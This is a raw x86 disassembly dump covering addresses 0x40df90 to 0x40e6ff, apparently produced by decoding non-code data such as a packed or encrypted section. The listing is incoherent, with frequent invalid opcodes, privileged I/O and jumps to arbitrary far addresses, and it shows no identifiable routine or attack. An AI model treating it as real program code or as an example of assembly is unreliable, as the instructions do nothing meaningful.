  40df90:	mov    ch,0x6e
  40df92:	xchg   BYTE PTR [edx],al
  40df94:	lahf   
  40df95:	inc    esp
  40df96:	mov    ds,eax
  40df98:	inc    esp
  40df99:	mov    ecx,0x2403ee89
  40df9e:	imul   esp,eax,0x2d6d2e37
  40dfa4:	push   DWORD PTR [ebx+0xb3944e1]
  40dfaa:	in     al,dx
  40dfab:	and    BYTE PTR ds:0x16acfa20,al
  40dfb1:	xchg   esi,eax
  40dfb2:	xchg   ebp,ebx
  40dfb4:	test   eax,0xe3bdd1c6
  40dfb9:	scas   al,BYTE PTR es:[edi]
  40dfba:	sbb    esp,DWORD PTR [ebx+0x72]
  40dfbd:	push   es
  40dfbe:	cs gs xchg ecx,eax
  40dfc1:	adc    ebp,DWORD PTR [edx+0xe]
  40dfc4:	dec    sp
  40dfc6:	inc    ebp
  40dfc7:	pop    ss
  40dfc8:	mov    ch,0x17
  40dfca:	fisttp DWORD PTR [ebx-0x361865ea]
  40dfd0:	add    BYTE PTR [ebx+0x7d],ch
  40dfd3:	mov    esp,0x1651f0d0
  40dfd8:	mov    ah,0x84
  40dfda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfdb:	xor    eax,edi
  40dfdd:	or     DWORD PTR [eax-0x521a2039],esi
  40dfe3:	mov    ebx,0x32a16e99
  40dfe8:	and    BYTE PTR [edi-0x38],al
  40dfeb:	xchg   esi,eax
  40dfec:	sar    esp,0x9a
  40dfef:	sahf   
  40dff0:	cmp    BYTE PTR gs:[ebx],cl
  40dff3:	or     DWORD PTR [eax-0x5b],edi
  40dff6:	sub    eax,0xa27127e
  40dffb:	inc    esi
  40dffc:	push   edx
  40dffd:	in     eax,0x16
  40dfff:	inc    edx
  40e000:	sub    dh,BYTE PTR [ebp+0x47646688]
  40e006:	rol    DWORD PTR [esp+eax*2+0x7cf67a16],0x9c
  40e00e:	xchg   ebx,eax
  40e00f:	clc    
  40e010:	scas   eax,DWORD PTR es:[edi]
  40e011:	fisttp WORD PTR [ebp-0x49494533]
  40e017:	fcom   DWORD PTR [ecx+0x1a]
  40e01a:	cmp    eax,0xf18b6e61
  40e01f:	daa    
  40e020:	das    
  40e021:	or     esi,DWORD PTR [bp+di]
  40e024:	pop    ecx
  40e025:	jmp    FWORD PTR [edi+0x7462902e]
  40e02b:	adc    esp,ecx
  40e02d:	mov    ds:0x703141ab,al
  40e032:	ret    
  40e033:	test   al,0x41
  40e035:	jecxz  0x40e02f
  40e037:	jle    0x40e094
  40e039:	or     al,BYTE PTR [edx]
  40e03b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e03c:	xor    DWORD PTR [ebp-0x15586090],ebp
  40e042:	call   0xa6bd8013
  40e047:	xchg   edi,eax
  40e048:	sub    eax,0xdc1c49c8
  40e04d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e04e:	(bad)  [ebx+0x2]
  40e051:	sbb    edi,DWORD PTR [eax+0x6c]
  40e054:	dec    ebp
  40e055:	sub    dl,BYTE PTR [esi+0x3]
  40e058:	pop    ebp
  40e059:	and    DWORD PTR [esi],edi
  40e05b:	repz fisub DWORD PTR [ebp-0x6a724713]
  40e062:	sub    bl,dl
  40e064:	push   eax
  40e065:	mov    ds:0xa90f7fbb,eax
  40e06a:	ffreep st(1)
  40e06c:	pop    ebx
  40e06d:	jb     0x40dff0
  40e06f:	outs   dx,DWORD PTR ss:[esi]
  40e071:	mov    edi,0x21419cf1
  40e076:	std    
  40e077:	pop    esi
  40e078:	fwait
  40e079:	adc    ecx,DWORD PTR [esi+0x5]
  40e07c:	(bad)  
  40e07d:	jne    0x40e08a
  40e07f:	aad    0xa
  40e081:	lods   al,BYTE PTR ds:[esi]
  40e082:	stos   BYTE PTR es:[edi],al
  40e083:	sbb    al,0x37
  40e085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e086:	add    eax,0x6136ea6e
  40e08b:	loop   0x40e03c
  40e08d:	add    eax,0x84f263a
  40e092:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40e094:	pop    ds
  40e095:	stos   BYTE PTR es:[edi],al
  40e096:	cli    
  40e097:	xchg   esp,eax
  40e098:	push   edx
  40e099:	xor    al,0xa6
  40e09b:	outs   dx,DWORD PTR ds:[esi]
  40e09c:	xor    ebp,DWORD PTR [eax+0x4a]
  40e09f:	and    DWORD PTR [ebp+ebx*4-0x1a],edx
  40e0a3:	scas   eax,DWORD PTR es:[edi]
  40e0a4:	and    eax,0xf8b12c6b
  40e0a9:	adc    eax,0x4e922932
  40e0ae:	ja     0x40e0cc
  40e0b0:	scas   al,BYTE PTR es:[edi]
  40e0b1:	mov    esi,0x10631119
  40e0b6:	add    DWORD PTR [edx-0x3f],eax
  40e0b9:	push   ecx
  40e0ba:	test   al,0x2c
  40e0bc:	je     0x40e0a2
  40e0be:	sar    BYTE PTR [esi],0x8e
  40e0c1:	adc    DWORD PTR [eax+0x12b1ad60],eax
  40e0c7:	mov    dh,0x97
  40e0c9:	push   0x404ffaa9
  40e0ce:	(bad)  
  40e0cf:	cmc    
  40e0d0:	jnp    0x40e091
  40e0d2:	adc    al,0xdd
  40e0d4:	ret    
  40e0d5:	dec    esp
  40e0d6:	jo     0x40e103
  40e0d8:	es stos DWORD PTR es:[edi],eax
  40e0da:	mov    gs,WORD PTR [ebx-0x5c]
  40e0dd:	and    bl,cl
  40e0df:	xchg   BYTE PTR [ebp-0x6838f831],al
  40e0e5:	mov    eax,0xb41de9e5
  40e0ea:	loopne 0x40e095
  40e0ec:	add    eax,0x8b158098
  40e0f1:	push   ds
  40e0f2:	test   al,0xda
  40e0f4:	inc    esi
  40e0f5:	xor    al,0xe8
  40e0f7:	lods   eax,DWORD PTR ds:[esi]
  40e0f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0f9:	pop    esi
  40e0fa:	mov    esi,0x3cbc52e3
  40e0ff:	out    0xb2,eax
  40e101:	int    0x6a
  40e103:	es pusha 
  40e105:	pop    ebx
  40e106:	loope  0x40e0ec
  40e108:	fadd   QWORD PTR [ebx+ebp*2+0x6a]
  40e10c:	and    DWORD PTR [ebp-0x48],esi
  40e10f:	xor    dl,BYTE PTR [edx]
  40e111:	jg     0x40e0dc
  40e113:	mov    esi,0x494cf700
  40e118:	popf   
  40e119:	repz ror BYTE PTR [eax+0x709c56c1],0x34
  40e121:	jnp    0x40e132
  40e123:	mov    BYTE PTR [ebx+ebx*4],ch
  40e126:	add    al,0xf8
  40e128:	jne    0x40e168
  40e12a:	mov    cl,0xc
  40e12c:	addr16 cli 
  40e12e:	scas   al,BYTE PTR es:[edi]
  40e12f:	iret   
  40e130:	data16 jb 0x40e0c9
  40e133:	lock call 0x72a2:0xc588e490
  40e13b:	sbb    al,BYTE PTR ds:0x881031db
  40e141:	(bad)
  40e144:	or     al,0xa6
  40e146:	call   0xfe48:0xb172baba
  40e14d:	sbb    DWORD PTR [esi-0x57],esi
  40e150:	sub    esp,DWORD PTR [ecx+0x1b]
  40e153:	mov    WORD PTR [ecx],ds
  40e155:	push   ecx
  40e156:	and    ebp,DWORD PTR [esi]
  40e158:	lods   al,BYTE PTR ds:[esi]
  40e159:	push   ecx
  40e15a:	loope  0x40e13b
  40e15c:	mov    DWORD PTR [ebx+0x22afecb],ebx
  40e162:	inc    esp
  40e163:	in     al,dx
  40e164:	shl    ebp,0x16
  40e167:	and    BYTE PTR [eax+eiz*4-0x4a],0xd4
  40e16c:	fsubr  DWORD PTR [eax-0x23]
  40e16f:	xor    ecx,DWORD PTR [esi-0x6f5b3f19]
  40e175:	xchg   ebx,eax
  40e176:	stos   DWORD PTR es:[edi],eax
  40e177:	imul   eax,DWORD PTR [edx],0x4d
  40e17a:	xchg   ebp,eax
  40e17b:	(bad)  
  40e17c:	faddp  st(7),st
  40e17e:	xor    ch,BYTE PTR [ebx-0x7e53943]
  40e184:	xchg   DWORD PTR [eax-0x17],ebx
  40e187:	xchg   esi,eax
  40e188:	(bad)  [ebx]
  40e18a:	adc    eax,DWORD PTR [bx]
  40e18d:	mov    ds:0xc9a354a4,eax
  40e192:	jo     0x40e1e7
  40e194:	jp     0x40e1ae
  40e196:	push   0xffffffef
  40e198:	and    BYTE PTR [ebx],bl
  40e19a:	dec    ecx
  40e19b:	stc    
  40e19c:	add    BYTE PTR [edi-0x2e8c9da1],0x4c
  40e1a3:	jmp    0x5c2f:0xe9abcab4
  40e1aa:	je     0x40e151
  40e1ac:	and    eax,0xb41cd353
  40e1b1:	sub    BYTE PTR [ebx-0xb0f550],cl
  40e1b7:	jecxz  0x40e13d
  40e1b9:	and    eax,DWORD PTR [ecx+0x68]
  40e1bc:	inc    eax
  40e1bd:	dec    edi
  40e1bf:	inc    eax
  40e1c0:	jp     0x40e16f
  40e1c2:	pop    ebp
  40e1c3:	std    
  40e1c4:	fnsetpm(287 only) 
  40e1c6:	rcl    BYTE PTR [ebx+0x56],cl
  40e1c9:	adc    dl,al
  40e1cb:	pop    edx
  40e1cc:	mov    ch,0x5d
  40e1ce:	repnz dec ebx
  40e1d0:	xchg   esp,eax
  40e1d1:	cmp    eax,0xa54c1965
  40e1d6:	imul   edx,DWORD PTR [esi],0xffffffdf
  40e1d9:	arpl   WORD PTR [edx+0x12],di
  40e1dc:	and    ebx,edi
  40e1de:	pop    eax
  40e1df:	jne    0x40e1b7
  40e1e1:	xor    al,BYTE PTR [ebp+0x3c3734d5]
  40e1e7:	out    0xac,eax
  40e1e9:	imul   edx,DWORD PTR [eax],0xb73c24fe
  40e1ef:	xchg   edi,eax
  40e1f0:	xchg   esi,eax
  40e1f1:	ja     0x40e1a9
  40e1f3:	inc    ebp
  40e1f4:	shl    cl,1
  40e1f6:	dec    edx
  40e1f7:	push   cs
  40e1f8:	push   esp
  40e1f9:	dec    eax
  40e1fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1fb:	mov    bh,0x92
  40e1fd:	inc    ecx
  40e1fe:	retf   0x8e0
  40e201:	out    dx,al
  40e202:	adc    DWORD PTR [ebp+0x5b],ebx
  40e205:	inc    ebp
  40e206:	iret   
  40e207:	pop    ds
  40e208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e209:	cmp    BYTE PTR [ecx],ah
  40e20b:	das    
  40e20c:	cmp    ebx,DWORD PTR [ecx-0x78]
  40e20f:	xchg   ebx,eax
  40e210:	in     eax,0xcf
  40e212:	es jecxz 0x40e27b
  40e215:	jmp    0x3bf91e11
  40e21a:	sub    al,0xcf
  40e21c:	(bad)
  40e21f:	push   ss
  40e220:	daa    
  40e221:	fucomip st,st(3)
  40e223:	call   0x5840a98e
  40e228:	ins    BYTE PTR es:[edi],dx
  40e229:	xor    ch,BYTE PTR [ebx-0x3f]
  40e22c:	push   0x5f11280
  40e231:	push   edx
  40e232:	mov    al,0x7c
  40e234:	sub    al,0x2d
  40e236:	mov    ebp,0x5d10c4d1
  40e23b:	xchg   DWORD PTR [ebx+0x5f7c4196],ebx
  40e241:	pop    edi
  40e242:	cmp    eax,0x25a238af
  40e247:	imul   edi,DWORD PTR [edi],0xad38ac79
  40e24d:	div    esp
  40e24f:	push   esi
  40e250:	stos   DWORD PTR es:[edi],eax
  40e251:	adc    bl,bh
  40e253:	int3   
  40e254:	mov    ch,0xb1
  40e256:	and    al,0x7d
  40e258:	call   0x67f1:0x8f33660
  40e25f:	adc    dh,BYTE PTR [ecx+eiz*1-0x6c]
  40e263:	lods   al,BYTE PTR ds:[esi]
  40e264:	pop    ebp
  40e265:	in     eax,dx
  40e266:	adc    al,0x56
  40e268:	fistp  DWORD PTR [edx+ecx*8-0x60]
  40e26c:	mov    esp,0xf15f8925
  40e271:	push   esi
  40e272:	or     ch,BYTE PTR [edx]
  40e274:	lock cmp al,0xa
  40e277:	icebp  
  40e278:	fisub  WORD PTR [ebx-0x72]
  40e27b:	mov    ds:0x3a276a7d,eax
  40e280:	daa    
  40e281:	xchg   ebx,eax
  40e282:	in     al,dx
  40e283:	jl     0x40e2e3
  40e285:	in     eax,0x1b
  40e287:	cwde   
  40e288:	jo     0x40e286
  40e28a:	aam    0xd0
  40e28c:	mov    BYTE PTR [ebx-0x6c],bh
  40e28f:	(bad)  
  40e290:	and    BYTE PTR [ecx+eax*4+0x294218c1],dh
  40e297:	add    BYTE PTR [ebx],bh
  40e299:	or     ecx,edi
  40e29b:	xchg   esi,eax
  40e29c:	or     DWORD PTR [edi-0x35],ebp
  40e29f:	xchg   ebx,eax
  40e2a0:	fmulp  st(7),st
  40e2a2:	call   0x5e79713e
  40e2a7:	das    
  40e2a8:	(bad)  
  40e2aa:	arpl   WORD PTR [ebx+edi*8+0x57],sp
  40e2ae:	out    0xb6,al
  40e2b0:	sti    
  40e2b1:	jg     0x40e240
  40e2b3:	mov    ds:0x11795b14,al
  40e2b8:	or     al,0x7b
  40e2ba:	mov    WORD PTR [edi],fs
  40e2bc:	mov    ebx,0xb3f1422b
  40e2c1:	push   ecx
  40e2c2:	js     0x40e268
  40e2c4:	fnstcw WORD PTR [ebp+0x56]
  40e2c7:	or     eax,0xb284afee
  40e2cc:	es rcl ch,1
  40e2cf:	fnstenv [esi+0x1a]
  40e2d2:	jbe    0x40e27f
  40e2d4:	lock addr16 push es
  40e2d7:	pop    ecx
  40e2d8:	sub    al,0xf4
  40e2da:	jbe    0x40e345
  40e2dc:	mov    ch,0x72
  40e2de:	adc    esp,DWORD PTR [ebx+0x8]
  40e2e1:	scas   eax,DWORD PTR es:[edi]
  40e2e2:	push   cs
  40e2e3:	push   ebx
  40e2e4:	pusha  
  40e2e5:	and    esi,DWORD PTR [ecx+0x5]
  40e2e8:	retf   
  40e2e9:	xchg   ebp,eax
  40e2ea:	dec    esp
  40e2eb:	retf   
  40e2ec:	rol    esi,0x2
  40e2ef:	(bad)  [eax+0x7433002]
  40e2f5:	mov    fs,edx
  40e2f7:	sbb    dl,BYTE PTR [ebp+0x2e36dbb2]
  40e2fd:	(bad)  
  40e2ff:	iret   
  40e300:	adc    BYTE PTR [esi-0x1c],0xf4
  40e304:	jb     0x40e381
  40e306:	inc    eax
  40e307:	test   eax,0x86d71144
  40e30c:	push   ebx
  40e30d:	add    BYTE PTR [esi+0x5],ah
  40e310:	aaa    
  40e311:	ss adc edi,esi
  40e314:	xchg   BYTE PTR [edx-0xa],ch
  40e317:	jle    0x40e2c2
  40e319:	mov    ds:0x199d940,al
  40e31e:	adc    BYTE PTR [eax],0xd1
  40e321:	bound  esp,QWORD PTR [edi]
  40e323:	mov    ebx,0x5668a137
  40e328:	imul   ecx,ecx,0x23
  40e32b:	ror    DWORD PTR [ecx+edi*2],1
  40e32e:	lahf   
  40e32f:	pop    edi
  40e330:	daa    
  40e331:	mov    edi,DWORD PTR [eax-0x50]
  40e334:	pusha  
  40e335:	jp     0x40e367
  40e337:	xor    DWORD PTR [edi+0x36],eax
  40e33a:	adc    BYTE PTR [ebx+0x33a8d07],ch
  40e340:	dec    edi
  40e341:	mov    DWORD PTR [edi+0x1213d574],ebx
  40e347:	cwde   
  40e348:	test   al,0x42
  40e34a:	bound  ebp,QWORD PTR [ebx-0x75bf0908]
  40e350:	scas   eax,DWORD PTR es:[edi]
  40e351:	push   cs
  40e352:	push   0x22
  40e354:	adc    DWORD PTR [eax-0x47a2f014],0xffffffa1
  40e35b:	inc    ecx
  40e35c:	imul   ecx,DWORD PTR [ebx-0x13e77f2b],0xffffffe5
  40e363:	loopne 0x40e2f1
  40e365:	jl     0x40e37a
  40e367:	jmp    0x40e3bc
  40e369:	xchg   DWORD PTR [ebp+0x5d874750],ebp
  40e36f:	leave  
  40e370:	call   0x7774:0xaaed9697
  40e377:	mov    ch,BYTE PTR [ecx+eiz*4+0x532c5eb8]
  40e37e:	inc    DWORD PTR [ebx+0x1]
  40e381:	mov    bh,0xc3
  40e383:	mov    ebp,0xb917d510
  40e388:	je     0x40e39f
  40e38a:	inc    esp
  40e38b:	pop    esp
  40e38c:	popa   
  40e38d:	or     al,0x1e
  40e38f:	shl    DWORD PTR [edi+0x716e3a92],cl
  40e395:	mov    WORD PTR [ebx+0x9],cs
  40e398:	into   
  40e399:	xchg   edx,eax
  40e39a:	sub    DWORD PTR gs:[esp+esi*1-0x43],0x9edd8547
  40e3a3:	stc    
  40e3a4:	je     0x40e3bb
  40e3a6:	adc    eax,0x624eba7d
  40e3ab:	pusha  
  40e3ac:	bound  edi,QWORD PTR cs:[eax+ebx*2]
  40e3b0:	iret   
  40e3b1:	scas   eax,DWORD PTR es:[edi]
  40e3b2:	jbe    0x40e3ca
  40e3b4:	nop
  40e3b5:	cli    
  40e3b6:	lahf   
  40e3b7:	and    BYTE PTR [ecx+0x21d74b8],0xec
  40e3be:	mov    ch,0x76
  40e3c0:	add    BYTE PTR [edx+0x49f7a013],ah
  40e3c6:	mov    cl,0x97
  40e3c8:	fs sbb al,0x7a
  40e3cb:	pop    ds
  40e3cc:	mov    eax,0x6ca98c
  40e3d1:	adc    esp,DWORD PTR [edi+0x6d8b87a9]
  40e3d7:	push   ss
  40e3d8:	mov    ebx,0x76cf9835
  40e3dd:	jno    0x40e420
  40e3df:	cld    
  40e3e0:	push   ebp
  40e3e1:	mov    ah,0x44
  40e3e3:	and    esp,eax
  40e3e5:	cli    
  40e3e6:	js     0x40e3c8
  40e3e8:	aam    0x29
  40e3ea:	mov    ah,0x0
  40e3ec:	push   ecx
  40e3ed:	repz inc eax
  40e3ef:	add    dh,BYTE PTR [eax+0x33]
  40e3f2:	hlt    
  40e3f3:	xor    BYTE PTR [ecx+0x122ca6fb],ah
  40e3f9:	arpl   si,dx
  40e3fb:	ror    BYTE PTR [ebx-0x110e44b],1
  40e401:	aaa    
  40e402:	in     eax,0xbe
  40e404:	daa    
  40e405:	dec    eax
  40e406:	lahf   
  40e407:	jo     0x40e3a1
  40e409:	pop    ecx
  40e40a:	push   ds
  40e40b:	ja     0x40e3b2
  40e40d:	pop    eax
  40e40e:	pop    edi
  40e40f:	xchg   edx,eax
  40e410:	xor    eax,ebp
  40e412:	icebp  
  40e413:	std    
  40e414:	test   eax,0xbff85d9e
  40e419:	mov    ds:0x34ad57ae,al
  40e41e:	and    eax,0xd34a7a5a
  40e423:	pop    ds
  40e424:	xchg   esi,eax
  40e425:	aas    
  40e426:	pop    ecx
  40e427:	or     DWORD PTR [edx],ebp
  40e429:	adc    ch,ch
  40e42b:	xchg   BYTE PTR [edi+0x168cd89b],ch
  40e431:	and    esi,DWORD PTR [esi]
  40e433:	cs sbb ch,bl
  40e436:	xchg   esp,eax
  40e437:	test   dl,al
  40e439:	fwait
  40e43a:	or     al,BYTE PTR [edi-0x22]
  40e43d:	scas   al,BYTE PTR es:[edi]
  40e43e:	sub    BYTE PTR [ebx-0x4d240262],cl
  40e444:	(bad)  
  40e445:	and    eax,DWORD PTR [esi]
  40e447:	or     al,0x91
  40e449:	mov    ebx,0x38853d1d
  40e44e:	ret    
  40e44f:	jo     0x40e3f3
  40e451:	lods   eax,DWORD PTR ds:[esi]
  40e452:	push   ebx
  40e453:	test   BYTE PTR [ebx+0x6380e87a],bl
  40e459:	imul   edx,DWORD PTR ds:0x553b9a6b,0xfffffffb
  40e460:	call   0xaf17c35e
  40e465:	xor    bl,BYTE PTR [ebx]
  40e467:	mov    bh,0x1d
  40e469:	bound  ecx,QWORD PTR [eax-0x2f]
  40e46c:	add    dh,al
  40e46e:	mov    edx,0x770afc5f
  40e473:	cld    
  40e474:	cmp    dh,bl
  40e476:	bound  esp,QWORD PTR ds:0x411dfaac
  40e47c:	pop    esi
  40e47d:	or     BYTE PTR [ebx],ah
  40e47f:	mov    ebx,0x5ad55e7d
  40e484:	in     al,0x4a
  40e486:	mov    ebx,0x80af2452
  40e48b:	jmp    0x4003a812
  40e490:	push   eax
  40e491:	bound  edi,QWORD PTR ds:[edi+eiz*2+0x69]
  40e496:	sbb    ecx,DWORD PTR [ebx+eax*2+0x1f]
  40e49a:	dec    ecx
  40e49b:	ins    DWORD PTR es:[edi],dx
  40e49c:	jmp    0x6a61c58
  40e4a1:	stos   DWORD PTR es:[edi],eax
  40e4a2:	mov    es,edi
  40e4a4:	in     eax,0x30
  40e4a6:	add    BYTE PTR [esi+0x3d],ch
  40e4a9:	adc    ebp,eax
  40e4ab:	call   0x385ac9c2
  40e4b0:	fsub   DWORD PTR [eax]
  40e4b2:	jecxz  0x40e49f
  40e4b4:	outs   dx,BYTE PTR ds:[esi]
  40e4b5:	js     0x40e444
  40e4b7:	and    eax,edx
  40e4b9:	xchg   esp,eax
  40e4ba:	cwde   
  40e4bb:	mov    edx,0xf44acbad
  40e4c0:	xchg   ebx,eax
  40e4c1:	fwait
  40e4c2:	pop    ebp
  40e4c3:	dec    esp
  40e4c4:	add    eax,0xe7cacb51
  40e4c9:	shl    ch,1
  40e4cb:	xor    eax,0x139958a1
  40e4d0:	in     al,0xc2
  40e4d2:	dec    ebx
  40e4d3:	mov    ebp,DWORD PTR [edi+0x1d3fbc48]
  40e4d9:	sbb    BYTE PTR [ebx],ch
  40e4db:	test   al,0x7
  40e4dd:	outs   dx,BYTE PTR ds:[esi]
  40e4de:	fimul  DWORD PTR [edi-0x66]
  40e4e1:	or     bh,dh
  40e4e3:	pop    esi
  40e4e4:	test   eax,0xdba62828
  40e4e9:	cwde   
  40e4ea:	push   ds
  40e4eb:	dec    edi
  40e4ec:	push   ss
  40e4ed:	popf   
  40e4ee:	les    ebp,FWORD PTR [esi]
  40e4f0:	pop    eax
  40e4f1:	loope  0x40e4ab
  40e4f3:	jmp    0x6754fac8
  40e4f8:	fidiv  DWORD PTR [ecx]
  40e4fa:	sar    BYTE PTR [esi],0x39
  40e4fd:	icebp  
  40e4fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4ff:	adc    al,0x15
  40e501:	cmp    DWORD PTR [ebx-0x14],0xfb8872b3
  40e508:	pop    edx
  40e509:	adc    bl,BYTE PTR [edi]
  40e50b:	sahf   
  40e50c:	mov    ds:0x1436fe4c,al
  40e511:	or     eax,0x5516a083
  40e516:	mov    ecx,0x6794cc0e
  40e51b:	fst    DWORD PTR es:[esi-0x35]
  40e51f:	and    esp,DWORD PTR [ecx-0x67420d54]
  40e525:	push   ebp
  40e526:	dec    eax
  40e527:	das    
  40e528:	jne    0x40e4bd
  40e52a:	ret    0xc070
  40e52d:	pop    esp
  40e52e:	dec    esp
  40e52f:	sub    bl,BYTE PTR [esi-0x7b]
  40e532:	push   0x6b
  40e534:	sub    DWORD PTR [ecx+ebx*8-0x6e],edx
  40e538:	cs adc edx,edi
  40e53b:	adc    eax,0x88fb8188
  40e540:	retf   
  40e541:	xchg   cl,bh
  40e543:	fimul  WORD PTR [ebp+eax*4-0x2e]
  40e547:	in     eax,0x35
  40e549:	mov    ebx,0x25b86d92
  40e54e:	jae    0x40e57b
  40e550:	pop    esp
  40e551:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e552:	push   ds
  40e553:	sub    ah,BYTE PTR [edi+0x4a]
  40e556:	ja     0x40e527
  40e558:	imul   edx
  40e55a:	pop    eax
  40e55b:	in     al,dx
  40e55c:	pushf  
  40e55d:	jb     0x40e4fc
  40e55f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e560:	cli    
  40e561:	jge    0x40e5ba
  40e563:	xor    eax,0x81cc82c9
  40e568:	mov    edx,0xb2bd1dd6
  40e56d:	in     eax,0x6b
  40e56f:	lds    edx,FWORD PTR [edi]
  40e571:	test   DWORD PTR [ebx+0x278f26e6],ecx
  40e577:	(bad)  
  40e578:	stos   DWORD PTR es:[edi],eax
  40e579:	(bad)  
  40e57a:	shl    DWORD PTR [eax+esi*2+0x20196e93],1
  40e581:	pop    edi
  40e582:	fimul  DWORD PTR [edx-0x73]
  40e585:	mov    esp,0xc2dfd506
  40e58a:	das    
  40e58b:	inc    edx
  40e58c:	cmp    ch,BYTE PTR [eax-0x6c127159]
  40e592:	popf   
  40e593:	mov    ch,0xe5
  40e595:	xchg   ecx,eax
  40e596:	dec    ebx
  40e597:	and    eax,0xe5b83154
  40e59c:	rol    DWORD PTR [ebx+esi*4],0x5e
  40e5a0:	mov    ds:0xb7cf598f,eax
  40e5a5:	outs   dx,DWORD PTR ds:[esi]
  40e5a6:	stc    
  40e5a7:	out    dx,eax
  40e5a8:	dec    ecx
  40e5a9:	loopne 0x40e618
  40e5ab:	fimul  WORD PTR [esi]
  40e5ad:	add    ah,0xd
  40e5b0:	je     0x40e584
  40e5b2:	sub    DWORD PTR [ecx-0x72],ebx
  40e5b5:	out    0xfd,eax
  40e5b7:	sub    eax,0x636fb06a
  40e5bc:	sbb    al,0x4
  40e5be:	mov    DWORD PTR [eax],eax
  40e5c0:	stc    
  40e5c1:	out    dx,al
  40e5c2:	inc    ebp
  40e5c3:	pusha  
  40e5c4:	add    BYTE PTR [edx+0x31697187],al
  40e5ca:	aas    
  40e5cb:	cli    
  40e5cc:	jb     0x40e5da
  40e5ce:	mov    al,0x24
  40e5d0:	sub    al,0x13
  40e5d2:	jmp    0x3dac:0xab289817
  40e5d9:	xchg   BYTE PTR [ebx+0x3c4e926f],al
  40e5df:	fild   QWORD PTR ss:[esi-0x2f]
  40e5e3:	sbb    DWORD PTR [esi-0x2e],0xffffffa8
  40e5e7:	cld    
  40e5e8:	or     eax,0xaf5f3ffd
  40e5ed:	(bad)  
  40e5ef:	push   edi
  40e5f0:	xchg   ebp,eax
  40e5f1:	xchg   ecx,eax
  40e5f2:	jecxz  0x40e610
  40e5f4:	daa    
  40e5f5:	jo     0x40e64d
  40e5f7:	pop    eax
  40e5f8:	sub    BYTE PTR [esi-0x23e1fc2b],bh
  40e5fe:	pusha  
  40e5ff:	mov    dh,0x2d
  40e601:	inc    esi
  40e602:	dec    ebx
  40e603:	push   ebx
  40e604:	mov    WORD PTR [edi+0x66899b0d],ss
  40e60a:	mov    ds:0x932d9a84,eax
  40e60f:	js     0x40e65b
  40e611:	or     eax,0xe04e8fb6
  40e616:	adc    al,0x69
  40e618:	(bad)  
  40e619:	push   ss
  40e61a:	mov    bl,0xf8
  40e61c:	adc    bl,bl
  40e61e:	fstp   DWORD PTR [ebp+0x62]
  40e621:	inc    edi
  40e622:	cwde   
  40e623:	data16 mov ds:0x48b8dadf,al
  40e629:	mul    dl
  40e62b:	jo     0x40e606
  40e62d:	stos   DWORD PTR es:[edi],eax
  40e62e:	call   0x6d27:0xa622b6e3
  40e635:	mov    DWORD PTR [ecx+0x14],ebp
  40e638:	sbb    eax,0x1d4f42f1
  40e63d:	push   0xc62483b6
  40e642:	shl    ecx,cl
  40e644:	adc    dh,bl
  40e646:	jle    0x40e5d7
  40e648:	(bad)  [esi]
  40e64a:	arpl   di,si
  40e64c:	fimul  WORD PTR [ecx+0x27610401]
  40e652:	xor    eax,edx
  40e654:	push   ds
  40e655:	sub    eax,edx
  40e657:	xchg   DWORD PTR [eax+0x2a],esi
  40e65a:	cmp    BYTE PTR [ebx-0x7f540056],bl
  40e660:	cli    
  40e661:	fs inc edi
  40e663:	mov    dl,0xce
  40e665:	data16 (bad) 
  40e667:	test   eax,0xa868ee9a
  40e66d:	xchg   edi,eax
  40e66e:	mov    esi,0x9e288c37
  40e673:	aas    
  40e674:	jl     0x40e6b5
  40e676:	pop    esp
  40e677:	fistp  QWORD PTR [edi+0x560c1f8f]
  40e67d:	ja     0x40e68a
  40e67f:	test   eax,0xbb499c76
  40e684:	mov    al,0xb0
  40e686:	call   DWORD PTR [edx+0x7]
  40e689:	or     esp,DWORD PTR [edx]
  40e68b:	push   es
  40e68c:	sub    cl,al
  40e68e:	mov    BYTE PTR [eax+0x52],al
  40e691:	jo     0x40e6ee
  40e693:	retf   0x472e
  40e696:	dec    eax
  40e697:	xor    eax,0x42126d73
  40e69c:	js     0x40e70b
  40e69e:	push   ebx
  40e69f:	gs pop esi
  40e6a1:	push   edx
  40e6a2:	ds out dx,al
  40e6a4:	mov    al,ds:0xb60af0d6
  40e6a9:	std    
  40e6aa:	inc    ecx
  40e6ab:	push   0xffffffb1
  40e6ad:	xchg   BYTE PTR [ecx],al
  40e6af:	pop    ebp
  40e6b0:	mov    eax,ds:0xb718bd59
  40e6b5:	push   edi
  40e6b6:	pop    ebx
  40e6b7:	xchg   ecx,eax
  40e6b8:	xlat   BYTE PTR ds:[ebx]
  40e6b9:	mov    WORD PTR [eax+0x4343e763],fs
  40e6bf:	neg    BYTE PTR [ebx]
  40e6c1:	sub    al,0xa1
  40e6c3:	pusha  
  40e6c4:	xor    ah,ah
  40e6c6:	jg     0x40e6a6
  40e6c8:	pop    edi
  40e6c9:	jb     0x40e6b8
  40e6cb:	ins    BYTE PTR es:[edi],dx
  40e6cc:	add    cl,BYTE PTR [edx+0x38]
  40e6cf:	(bad)  
  40e6d0:	test   BYTE PTR [edx-0xc],dl
  40e6d3:	dec    esp
  40e6d4:	sbb    DWORD PTR [ecx+0x68],0x28ee65d1
  40e6db:	loop   0x40e689
  40e6dd:	xchg   esp,eax
  40e6de:	sbb    dh,BYTE PTR [ebx+eax*1]
  40e6e1:	stos   BYTE PTR es:[edi],al
  40e6e2:	xchg   DWORD PTR [esi-0x696c12e9],ebx
  40e6e8:	adc    DWORD PTR [ebx],edi
  40e6ea:	sub    ah,BYTE PTR [edi-0x56]
  40e6ed:	jo     0x40e676
  40e6ef:	add    BYTE PTR [eax],ch
  40e6f1:	xchg   esp,eax
  40e6f2:	imul   esp,ebp,0x1e
  40e6f5:	imul   esi,DWORD PTR [eax+0x17],0x25
  40e6f9:	pop    ecx
  40e6fa:	xor    dl,0xc1
  40e6fd:	clc    
  40e6fe:	pusha  
  40e6ff:	inc    edi
